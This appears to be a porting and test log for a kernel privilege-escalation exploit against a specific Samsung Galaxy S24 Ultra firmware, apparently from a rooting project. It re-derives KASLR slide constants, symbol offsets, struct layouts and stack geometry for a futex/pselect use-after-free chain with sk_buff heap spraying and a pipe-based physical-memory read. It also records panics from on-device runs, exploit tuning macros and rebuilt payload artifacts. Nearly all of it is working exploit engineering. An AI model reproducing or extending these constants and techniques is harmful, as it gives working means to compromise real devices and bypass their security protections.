# SM-S928B / S928BXXS5CZC1 (Galaxy S24 Ultra, e3q, Android 16)

Porting and re-verification record for the `e3q-S928BXXS5CZC1` target. Every
firmware-dependent constant was re-derived from the exact `S928BXXS5CZC1_EUX`
firmware on 2026-08-08, following `PORTING.md`. Three slide constants in the
originally committed `target.h` did not survive re-derivation and were
corrected; all other values were confirmed.

## Firmware identity

Downloaded with samloader from FUS (model `SM-S928B`, region `EUX`), completed
manually after a transport stall; every zip entry's CRC32 verified intact.

```text
file:    S928BXXS5CZC1_EUX.zip
size:    17928480688
entries: BL/AP/CP/HOME_CSC/CSC tar.md5, AP is meta_OS16
```

Build identity from `meta-data/fota.zip` inside the AP tar:

```text
ro.bootimage.build.fingerprint=samsung/e3qxxx/e3q:14/UP1A.231005.007/S928BXXS5CZC1:user/release-keys
ro.system.build.fingerprint=samsung/e3qxxx/qssi_64:16/BP2A.250605.031.A3/S928BXXS5CZC1:user/release-keys
ro.build.display.id=BP2A.250605.031.A3.S928BXXS5CZC1
```

`BUILD_FINGERPRINT` keeps the boot-image identity (`14/UP1A.231005.007`),
matching `ro.bootimage.build.fingerprint` of the partition that actually ships
the kernel. The live device additionally reports
`ro.build.fingerprint=...:16/BP4A.251205.006/...`; that is the device-level
property, not the boot image's. Live device cross-check:

```text
uname -r: 6.1.128-android14-11-31999054-abS928BXXS5CZC1
ro.build.fingerprint: samsung/e3qxxx/e3q:16/BP4A.251205.006/S928BXXS5CZC1:user/release-keys
```

## Kernel recovery

`boot.img.lz4` (21569216 bytes) decompressed to `boot.img` (100663296 bytes):

```text
boot.img SHA-256: 05E27BE9CF05D1DA8237C80768FDB2D0E778BC23CE547E62EF781C71F2C5140A
kernel   SHA-256: D4FEB6B808D2E45FC7E9F4E5C4529B5FDE017F644F261BA21F98412DF3712442
kernel   size:    37022208
ARM64 Image: magic ARMd, text_offset 0x0, image_size 0x25c0000, flags 0xa
```

`vmlinux-to-elf` recovered 104498 kallsyms at base `0xffffffc008000000`
(`KIMAGE_TEXT_BASE` confirmed). Exactly one valid raw BTF blob was found and
extracted: `[0x1769e0c, 0x1d00646)` (5859386 bytes), dumped with `bpftool` in
raw and C formats.

## Symbol offsets (all confirmed against `vmlinux.nm`)

`call_usermodehelper_exec_work` 0x000d388c, `noop_llseek` 0x0039ed18,
`generic_file_splice_read` 0x003ecac8, `configfs_read_iter` 0x0046e4c0,
`configfs_bin_write_iter` 0x0046e9f0, `ashmem_ioctl` 0x00cda318,
`compat_ashmem_ioctl` 0x00cdac50, `ashmem_mmap` 0x00cdaca8,
`ashmem_open` 0x00cdaed4, `ashmem_release` 0x00cdaf5c,
`ashmem_show_fdinfo` 0x00cdb07c, `anon_pipe_buf_ops` 0x011b6bd0,
`ashmem_fops` 0x0135e7a0, `kmalloc_caches` 0x016d09d8,
`system_unbound_wq` 0x0215ae60, `init_task` 0x0216f8c0,
`root_task_group` 0x0235cd80 — all match `target.h` exactly.

`ASHMEM_MISC_FOPS_OFF 0x022cfc30` = `ashmem_miscs` (0x022cfc20) +
`offsetof(struct miscdevice, fops)` (0x10, BTF-confirmed). ✓

`SELINUX_ENFORCING_OFF 0x02431460` = `selinux_state` (0x02431460) + `enforcing`
at member offset 0x0 (BTF-confirmed). ✓

## Struct layouts (BTF-verified)

`file_operations` size 0x110 with `unlocked_ioctl` 0x50, `compat_ioctl` 0x58,
`mmap` 0x60, `open` 0x70, `release` 0x80, `splice_read` 0xc8,
`show_fdinfo` 0xe0. `task_struct`: `usage` 0x40, `prio` 0x84,
`normal_prio` 0x8c, `sched_task_group` 0x348, `pi_lock` 0x924,
`pi_waiters` 0x938, `pi_top_task` 0x948, `pi_blocked_on` 0x950.
`rt_mutex_waiter` size 0x58, compact: `tree_entry` 0x00, `pi_tree_entry` 0x18,
`task` 0x30, `lock` 0x38, `wake_state` 0x40, `prio` 0x44, `deadline` 0x48,
`ww_ctx` 0x50 (`COMPACT_RT_MUTEX_WAITER 1` correct). `configfs_buffer` size
0x80: `page` 0x10, `needs_read_fill` 0x50, `bin_buffer` 0x58,
`bin_buffer_size` 0x60, `cb_max_size` 0x64. `workqueue_struct.dfl_pwq` 0xb0;
`pool_workqueue`: `pool` 0x00, `wq` 0x08, `work_color` 0x10, `refcnt` 0x18,
`nr_active` 0x5c, `max_active` 0x60; `worker_pool`: `worklist` 0x28,
`nr_idle` 0x3c; `work_struct`: `data` 0x00, `entry` 0x08, `func` 0x18.
`struct page` size 0x40: `compound_head` 0x08 (compound variant of the first
union), `page_type` 0x30; SLUB tracks the cache through `struct slab` with
`slab_cache` at 0x18. `skb_shared_info` size 0x158 (344) — same
`SKB_MAX_HEAD(0)` = 0xe80 geometry as DZF2; `SKB_DATA_DELTA -0x1000` retained
(page-aligned first order-3 fragment, as documented for the sibling).

## Slide constants: three corrected, rest confirmed

The oracle's `nfnetlink_log` evidence, verified directly in the raw image:

```text
"nfnetlink_log" string:  exactly one occurrence, image offset 0x0161b7b5
loggers[] registry base: 0x02162968 (symbol)
nfulnl_logger object:    0x02162a20 (symbol) = loggers + 0xb8
object contents:         name -> 0xffffffc00961b7b5 (the string above),
                         type = 1, log -> 0xffffffc008eacd44
```

Per the DZF2 semantics, `SLIDE_NFULNL_LOGGER_NAME_IMAGE` must be the string
(so `leaked - offset` yields `_stext`) and `SLIDE_NFULNL_LOGGER_OBJECT_IMAGE`
must be the object (the rb parent write target). The originally committed
header pointed NAME at the object (0x02162a20) and OBJECT at the loggers
registry base (0x02162968, 0xb8 below the object). Corrected to:

```c
#define SLIDE_NFULNL_LOGGER_OFF 0x0161b7b5ULL   /* name string */
#define SLIDE_LOGGERS_0_1_OFF   0x02162a20ULL   /* nfulnl_logger object */
```

The `boot_id` sysctl evidence:

```text
sysctl_bootid (data storage): 0x024d35a8 (symbol) ✓
unique qword == &sysctl_bootid found at image offset 0x0228ab38
entry context: [0x228ab30] = 0xffffffc009606835 -> "boot_id" (procname),
               [0x228ab38] = 0xffffffc00a4d35a8 (data -> sysctl_bootid)
```

The committed value 0x0228aa30 belongs to a different `ctl_table` entry (its
qword is a .rodata string pointer, not `&sysctl_bootid`). Corrected to:

```c
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x0228ab38ULL
```

`SLIDE_INIT_TASK_OFF` / `SLIDE_ROOT_TASK_GROUP_OFF` / `SLIDE_SYSCTL_BOOTID_OFF`
confirmed from symbols (see above). `SLIDE_RB_PARENT_TYPE_RESTORE 1` retained
(exploit logic constant).

## Tracepoint channel

`__start_ftrace_events` 0x0211f108, `__event_sched_blocked_reason` 0x0211f3b8:
`(0x211f3b8 - 0x211f108) / 8 = 86` → `TRACE_SYSTEM_MESSAGE + 86` = **106**
(`SLIDE_TRACEFS_EVENT_ID 106` ✓, also observed live on the device at
`/sys/kernel/tracing/events/sched/sched_blocked_reason/id`).

`worker_thread` at 0x000dafa8; its blocking `bl schedule` sits at
0xffffffc0080db044, return address 0xffffffc0080db048 →
`SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000db048` ✓.

## pselect word shift

Frame geometry re-derived from the CZC1 disassembly:

```text
__arm64_sys_futex      sub sp, #0x70
do_futex               sub sp, #0x60
futex_wait_requeue_pi  sub sp, #0x1b0   ; rt_mutex_waiter local at sp + 0x98
  (x2 = sp+0x98 -> rt_mutex_wait_proxy_lock, x1 = sp+0x98 -> cleanup)
=> stale waiter at E - 0x1e8

__arm64_sys_pselect6   sub sp, #0x90    ; calls core_sys_select directly
core_sys_select        sub sp, #0x1c0   ; stack_fds (SELECT_STACK_ALLOC=256)
                                         at sp + 0x50, sets strided by size
=> stack_fds at E - 0x200
```

Waiter qword 0 therefore lands on global fd-set word (0x200 - 0x1e8) / 8 = 3:

```c
#define SLIDE_PSELECT_WORD_SHIFT 3
```

identical to the hardware-confirmed DZF2 geometry. The waiter the payload
reclaims is `futex_wait_requeue_pi`'s `rt_mutex_waiter` (the
`FUTEX_WAIT_REQUEUE_PI` route in `main.c` / `slide_app.c`), not the
`futex_lock_pi` local — the two frames differ by one qword on this kernel, so
the distinction decides between shift 3 and 2.

## Physical load address (Qualcomm ABL)

`BL_...tar.md5` → `abl.elf.lz4` (756403 bytes, SHA-256
b2d4a2ab6f9b7673627bfab23ed150ab49cc56698bc26d6d179904429eaf212e) → `abl.elf`
(2441528 bytes). Its single LOAD segment contains a UEFI FV at +0x28 whose
GUID-defined section is LZMA (`EE4E5898-3914-4259-9D6E-DC7BD79403CF`); the
decompressed inner FV (3359176 bytes) holds the LinuxLoader FFS
(`f536d559-459f-48fa-8bbc-43b554ecae8d`) with a PE32 section (0x190004 bytes).

In that PE (AArch64, image base 0):

1. Memory base is enumerated dynamically: RVA 0x12a38-0x12a54 walks the
   descriptor list with `cmp`/`csel lo` keeping the minimum, stores it, then
   prints `"Memory Base Address: 0x%x"` (string at RVA 0xcf9fa).
2. Constant table at RVA 0xd42f0: `0x00080000` (ARM64 load offset),
   0xd42f4: `0x05600000` (ARM64 region size), 0xd42f8: `0x03c00000`
   (ARM32 region), 0xd42fc: `0x00008000` (ARM32 offset).
3. RVA 0x176b8-0x17700 selects by arch flag: `csel` picks slot 0xd42f0 /
   0xd42f4 for ARM64, then `ldr w8, [0x80000]`, `ldr w9, [0x5600000]`,
   `orr x8, x10, x8` (load base = mem_base | 0x80000), `add x10, x10, x9`,
   `stp x8, x10, [sp, #0x88]`; an alternate path builds the same constant as
   `add x9, x8, #0x80, lsl #12` = +0x80000 (RVA 0x1774c).
4. `[sp, #0x88]` is later printed as `"Kernel Load Address: 0x%x"`
   (RVA 0x17d70-0x17d7c, string at RVA 0xb85d6).

The vendor_boot DTB (single FDT at vendor_boot+0xec2000) reserves
`gunyah_hyp_region@80000000`, anchoring the lowest RAM descriptor at
`0x80000000`. Therefore kernel load = `0x80000000 | 0x80000` = `0x80080000`,
entry = load + text_offset(0):

```c
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80080000ULL
```

## P0 fingerprint

`tools/generate_p0_fingerprint.pl` against the raw CZC1 kernel. The stock
probe offset `0x1f0000` was found to be unusable on this device (it probes
phys `0x80270000`, inside the nomap Gunyah hypervisor window — see
"Fingerprint probe relocation" below). The fingerprint is now generated at
probe offset `0x1aa0000` (`P0_ORACLE_PROBE_OFFSET`): all 32 rows verified
with 256 source qwords read back, all rows pairwise-distinct with every
word non-zero (SHA-256 of the file:
3195b110697f67d0a3bfec0ac0b0327e68309cc734ee76d942ec82bfc9b9f765).

## Build

Rebuilt with Android NDK r29 (`aarch64-linux-android35-clang`):

```sh
make TARGET=e3q-S928BXXS5CZC1 ANDROID_NDK_HOME=/tmp/android-ndk-r29 all release
```

The rebuilt release `.so` differs from the previously published artifact only
in the materialized slide constants (movn/movk pairs), e.g. the name-leak
constant `0x169b7b5` (string + 0x80000) replacing `0x21e2a20` (object +
0x80000), and the boot-id slot `0x230ab38` replacing `0x230aa30` — the runtime
constant base is image offset + 0x80000 (direct-map placement above
`P0_PHYS_OFFSET`). The fixed artifact:

```text
artifacts/e3q-S928BXXS5CZC1/cve-2026-43499-app.so
size:    104128 (enforced gate)
SHA-256: 8a2c68c1363006ad7173e7acf24397fed256fc764a388ebb2e39cadff96e0767
```

## KernelSU module

`kernelsu/android14-6.1_kernelsu-e3q-S928BXXS5CZC1-kdp.ko` audited against the
recovered CZC1 `vmlinux.elf` plus the extracted target `Module.symvers`
(8078 CRCs):

```text
vermagic: 6.1.128-android14-11-31999054-abS928BXXS5CZC1 SMP preempt mod_unload modversions aarch64
undefined symbols: 209
missing from target symbol table: 0
module version entries: 0 (manual-relocation build, .symtab/.strtab kept)
symbols resolved from kallsyms rather than target exports: 75
target CRC mismatches: 0
```

matches the documented E3Q audit profile (209 imports, 0 missing).

```text
android14-6.1_kernelsu-e3q-S928BXXS5CZC1-kdp.ko
size:    400200
SHA-256: 249194b189b333992e9d544d07080d342fe4d6be2f96af55d579be27183c4db7

ksud-e3q-S928BXXS5CZC1-kdp
size:    4782744
SHA-256: aceb0c36fe1c7a65978a2f4d2d9d45f82876bc7cec4d7b686d3dd4b623643df3
```

## Support feed

`support/targets-v3.json` already carries `e3q-S928BXXS5CZC1`
(SM-S928B, kernelVersions ["6.1.128"]) with exploit size 104128 and kernelsu
size 4782744 — both unchanged by the corrected rebuild. JSON re-validated.

## Provenance and cleanup

Retained after cleanup, per policy:

```text
analysis-s928b-czc1/firmware/AP/kernel
  source firmware: S928BXXS5CZC1_EUX.zip (SM-S928B, EUX, meta_OS16)
  AP tar entry: AP_S928BXXS5CZC1_S928BXXS5CZC1_MQB107205438_REV00_user_low_ship_MULTI_CERT_meta_OS16.tar.md5
  member: boot.img.lz4 (21569216) -> boot.img (100663296)
  kernel size:    37022208
  kernel SHA-256: D4FEB6B808D2E45FC7E9F4E5C4529B5FDE017F644F261BA21F98412DF3712442
  boot.img SHA-256: 05E27BE9CF05D1DA8237C80768FDB2D0E778BC23CE547E62EF781C71F2C5140A
```

Hardware execution of the rebuilt payload on the SM-S928B remains a separate
validation step (the DZF2 sibling profile was validated on an SM-S928U1).

## On-device run, 2026-08-08 (app payload, corrected offsets)

The corrected payload was pushed to the test feed and run on the device
(`ro.build.fingerprint` confirms `S928BXXS5CZC1`).

### Kernel panic analysis (run 1)

First run rebooted the phone. `bugreport.zip` (`dumpstate_lastkmsg.lst`,
`reset_summary.html`) shows the panic in process `cve43499-run` (pid 4674):

```text
pc : rt_mutex_adjust_prio_chain+0x26c/0x91c   (ldr w12, [x13, #0x44])
lr : rt_mutex_adjust_prio_chain+0x24c/0x91c
x24 (waiter->lock) = ffffff8a59d9c200         x13 (rb_node) = 003300000074962d
Call trace: rt_mutex_adjust_prio_chain -> rt_mutex_adjust_pi
  -> __sched_setscheduler -> __arm64_sys_sched_setattr
```

Disassembly of `rt_mutex_adjust_prio_chain` (vmlinux `0x88f0c8`) places the
fault at the `walk = node` tree-descent: `x13` was loaded from
`[fake_lock + 8]` (`waiters.rb_root.rb_node`) and `x12 = [fake_lock + 0x10]`
(`rb_leftmost`) was zero. Key conclusions:

- The corrected slide constants are right: `waiter->lock` pointed exactly at
  the designed fake-lock address `page_base + 0x4200`
  (`SLIDE_BANK_LOCK_OFF 0x5200 + SKB_DATA_DELTA -0x1000`), so the pselect
  stale-waiter overwrite lands and `SLIDE_PSELECT_WORD_SHIFT 3` is confirmed
  by hardware, matching the static derivation.
- The failure is *payload placement*: the reclaimed page did not hold the
  sprayed fake-lock/fake-waiter content when the PI walk consumed it (the
  garbage `0x0033...` value resembles foreign packet data — a reclaim miss
  on the target page, the same allocator-placement wall documented for the
  DZF2 sibling).

### App-side trace (run 2, no crash)

`exploit.log` from the app shows 7 attempts, all identical:

```text
mm leaked=ffffff8a570dd400 base=ffffff8a570d8000 object_index=21
sk_buff reclaim sends=28/28 mode=1
slide wait_requeue_pi ret=-1 errno=110            # expected (ETIMEDOUT path)
slide pselect returned nfds=320 ... ret=0 ... sched_ok=1 last_sched_ret=0
p0 physical write status=256 ok=0                 # child rejected
p0 physical slot=0 write window failed after 1 attempt(s)
```

Two defects identified against the hardware-proven family
(`e2s-S926BXXUEDZDR`, `e1s-S921BXXSFDZE1/FDZF3`):

1. **Acceptance gate**: without `APP_ACCEPT_SCHED_TRIGGER` the child requires
   `slide_pselect_write_window = (pselect_ret > 0 && sched_ok > 0)`. Nothing
   ever makes the watched pipe readable, so `pselect` always returns 0 at the
   100 ms timeout and every attempt is rejected even when the trigger chain
   forms correctly.
2. **Missing fresh-session design**: CZC1 lacked the proven reclaim block
   (`APP_REQUIRE_FRESH_P0_SESSION`): 192 reclaim sends with 16 MiB sndbuf,
   deferred drain reaps, quiet reclaim window, and the
   `object_index` 27..30 gate. The logged runs fired the trigger with
   `object_index` 9/14/21/25 — placements the proven profiles skip — which is
   how run 1 reached a half-formed fake lock and panicked. The proven profiles
   also arm the sched trigger only after `wchan` confirms the waiter is
   blocked inside pselect (`SLIDE_SYNC/GUARD_PSELECT_SYSCALL`) instead of a
   blind 50 ms delay.

### target.h changes (this round)

Aligned with the proven family block; all kernel-derived offsets, the bank
geometry (4 slots, task bank at `0x1000`) and `SKB_DATA_DELTA (-0x1000)` are
unchanged (the latter two are crash-validated, see above):

```c
#define APP_REQUIRE_FRESH_P0_SESSION 1
#define MM_ORDER 3
#define KERNELSNITCH_VERBOSE 1
#define KERNELSNITCH_FUTEX_HASH_SIZE 0x1000
#define KSNITCH_COLLISIONS 5
#define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
#define APP_SLIDE_RECLAIM_SENDS 192
#define APP_SLIDE_RECLAIM_SNDBUF 16777216
#define APP_MM_LATE_DRAIN_TRIGGERS 2
#define APP_DEFER_FINAL_DRAIN_REAP 1
#define APP_DEFER_ALL_DRAIN_REAPS 1
#define APP_QUIET_RECLAIM_WINDOW 1
#define APP_SLIDE_MIN_OBJECT_INDEX 27
#define APP_SLIDE_MAX_OBJECT_INDEX 30
#define APP_FOPS_MIN_OBJECT_INDEX 24
#define APP_RECLAIM_MAX_DIRECT_BASE 0xffffff8080000000ULL
#define APP_FOPS_PSELECT_DELAY_USEC 50000
#define SLIDE_SYNC_PSELECT_SYSCALL 1
#define SLIDE_GUARD_PSELECT_SYSCALL 1
#define SLIDE_PSELECT_READY_TIMEOUT_USEC 20000
#define SLIDE_PSELECT_RECHECK_TIMEOUT_USEC 20000
#define SLIDE_PSELECT_WCHAN_CONFIRMATIONS 3
#define APP_ACCEPT_SCHED_TRIGGER 1
#define APP_PSELECT_POST_GUARD_AGE_CHECK 1
```

App block additionally: `SLIDE_PSELECT_TIMEOUT_NSEC` 100 ms -> 500 ms,
`APP_PSELECT_TRIGGER_MAX_AGE_USEC 150000`, fresh-page search knobs
(`*_FRESH_PAGE_ATTEMPTS 8`, `*_KERNEL_PAGE_SEARCH_BATCHES 16`,
`SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 8`, `FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 8`),
`DEFAULT_EXPLOIT_ATTEMPTS 1`, `DEFAULT_ATTEMPT_TIMEOUT_SEC 2200`,
`DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 1200`, `P0_ORACLE_PRODUCTION_SLOT 4`.
`KERNELSNITCH_MTE_ENABLED` left at the default 0 (the CZC1 mm leak works
untagged, as on the DZF2 sibling; Exynos profiles need 1).

Rebuilt release artifact (size unchanged, feed entry untouched):

```text
artifacts/e3q-S928BXXS5CZC1/cve-2026-43499-app.so
size:    104128
SHA-256: d782664f5dfc267c589287eba78e4588525ebaa94050fca967c30679f457d39c
```

Binary verification: `mov w1, #0xc0` (192 sends), `movk x26, #0x21e, lsl #16`
(loggers object), `movk x24, #0x230, lsl #16` (boot_id data),
`movk x0, #0x169, lsl #16` (nfulnl_logger name) all present.

### Current status

The e3q family (CZC1, DZF2, DZE1) has no publicly confirmed hardware success
yet (DZF2 documented experimental; PR #31 DZE1 reporters see the same
leak-then-panic). CZC1 is now the best-instrumented e3q profile: offsets and
stack placement are crash-validated, and the remaining variable is reclaim
placement reliability, which the fresh-session design addresses. The next
on-device run should either complete the P0 oracle or emit the fresh-session
diagnostics (`fresh=N/8`, slabinfo dumps, wchan confirmations) needed to tune
further.

### Fresh-session run (run 3) and tuning corrections

The fresh-session build ran 24 attempts with no crash. Two configuration
defects surfaced immediately:

1. `APP_RECLAIM_MAX_DIRECT_BASE 0xffffff8080000000` (copied from the Exynos
   e1s/e2s profiles) rejects every legitimate reclaim candidate on this
   device: all observed mm slab bases are `>= ffffff8800000000`
   (e.g. `base=ffffff89feda8000 object_index=30` was in-band but rejected by
   the bound). Removed from `target.h`; the check is `#ifdef`-compiled.
2. The Exynos KernelSnitch tuning (`KSNITCH_COLLISIONS 5`,
   `KERNELSNITCH_COLLISION_CONFIRMATIONS 3`) makes the leak unreliable on this
   Snapdragon kernel: every attempt reported "found 4 collisisons" (never the
   requested 5) and the pipe-page leak failed 23/24 attempts
   (`pipe KernelSnitch sk_buff page leak failed`), while the previous build's
   defaults (4 collisions, 1 confirmation) passed the pipe oracle stage every
   attempt. Reverted to the defaults; `KERNELSNITCH_FUTEX_HASH_SIZE 0x1000`
   was also dropped (it equals the computed default 16 CPUs x 256 = 4096, so
   it was a no-op). `KERNELSNITCH_VERBOSE 1` is retained.

Notable: attempt 7/24 completed the pipe oracle
(`p0 pipe oracle prepared base=ffffff8002458000`) and ran the fresh-page
search (8 batches); the one successful mm leak (`object_index=30`, inside the
27..30 gate) was rejected only by the bad direct-map bound above. The
supervisor's `p0_timeout=45` (set by the companion app via env) can cut a
full 8-batch fresh search short (~40-56 s); with the leak reliability
restored, early batches should succeed within budget.

Rebuilt artifact:

```text
artifacts/e3q-S928BXXS5CZC1/cve-2026-43499-app.so
size:    104128
SHA-256: 70ea07b637d363672d03f3d9216adc5c1f0e76832ea3d8f895b07084ccf10382
```

### Fingerprint probe relocation (run 4, panic in __arch_copy_to_user)

Run 4 (fresh-session + corrected KernelSnitch tuning) panicked in attempt 3
(pid 13901, `cve43499-run`), and this time the chain reached the P0 physical
oracle: ftrace shows the `cve43499-p0ref` production thread active and the
pipe oracle prepared (`base=ffffff8958078000`, matching X26 in the register
dump). The panic:

```text
Unable to handle kernel paging request at virtual address ffffff8000270000
ESR = 0x96000006  (DABT, level 2 translation fault, WnR=0)
pgd=18000000b2c03003 pud=18000000b2c03003 pmd=0000000000000000
pc : __arch_copy_to_user+0x180/0x238   lr : copyout+0x90/0x114
Call trace: _copy_to_iter -> copy_page_to_iter -> pipe_read -> vfs_read
x1/x15/x21 = ffffff8000270000   (source: direct-map alias of phys 0x80270000)
x0 = 7ffb3367b8 (user dst)      x2 = 0xd88 (length)
```

The faulting read is the P0 fingerprint probe: `probe_va =
P0_PAGE_OFFSET | (0x80000 + P0_ORACLE_PROBE_OFFSET)`, redirected through the
poisoned `pipe_buffer`. With the stock `P0_ORACLE_PROBE_OFFSET 0x1f0000` the
probe touches phys `0x80270000`, and `pmd=0` shows the whole 2 MiB block
`[0x80200000, 0x80400000)` is absent from the direct map.

The reserved-memory map (dumpstate "reserved-memory" dump + node names)
explains why:

```text
gunyah_hyp_region   0x80000000 .. 0x80e00000  (14 MiB) nomap
cpusys_vm_region    0x80e00000 .. 0x81200000  ( 4 MiB) nomap
aop_cmd_db_region   0x81c60000 .. 0x81c80000  nomap
aop_tme_uefi_region 0x81c80000 ..             nomap
chipinfo_region     0x81cf4000                nomap
smem_region         0x81d00000 ..             nomap
pvmfw_region        0x824a0000 .. 0x825a0000  ( 1 MiB) nomap
global_sync_region  0x82600000 .. 0x82700000  nomap
tz_stat_region      0x82700000 .. 0x82800000  nomap
```

The kernel image is placed at `0x80080000+slide` (slide in `0..0x1f0000`),
so its first ~13.5 MiB always overlap the Gunyah window; execution is
unaffected (kernel text runs through its own mapping), but the linear alias
the P0 oracle reads through is punched out. The stock probe offset — valid
on targets without the low nomap carve-out — can never work here.

Fix: `P0_ORACLE_PROBE_OFFSET 0x1f0000 -> 0x1aa0000`. The probe becomes phys
`0x81b20000`, in plain RAM above the cpusys window and ~1.3 MiB below the
aop cluster, inside the kernel image for every candidate slide. The
fingerprint was regenerated with `tools/generate_p0_fingerprint.pl
raw-kernel 0x1aa0000`; the row window (file `[0x18b0000, 0x1aa0e00)`) sits
entirely in `.rodata` (file `[0x10f0000, 0x1d01000)`), so no row word can be
perturbed by boot-time alternatives patching. All 32 rows are
pairwise-distinct with 8/8 non-zero words (a brute-force sweep of
page-aligned probes in `[0x1180000, 0x1be0000)` picked the strongest
candidate; `0x1180000` produced sparse rows and `0x1300000` even colliding
all-zero rows from the kallsyms string-table padding).

Note for future ports on Gunyah devices: the post-discovery write targets
(`nfulnl_logger` phys `0x8169b7b5+slide`, `bootid_data` `0x8230ab38+slide`,
`sysctl_bootid` `0x825535a8+slide`) approach or enter the
pvmfw/global_sync/tz_stat nomap band `[0x824a0000, 0x82800000)` for the
highest slides (`slide >= 0x1a0000`). If a later stage ever faults at a
`ffffff8002xxxxxx` alias address, that band is why; the virtual-base write
path is unaffected.

Rebuilt artifact (size unchanged, feed entry untouched):

```text
artifacts/e3q-S928BXXS5CZC1/cve-2026-43499-app.so
size:    104128
SHA-256: ce58fa945f300ff6a9497c5bb605d253a0a8fc9b77ce494011592596c131e872
```

Binary verification: all 16 sampled fingerprint words from the regenerated
header are embedded in the release `.so`.
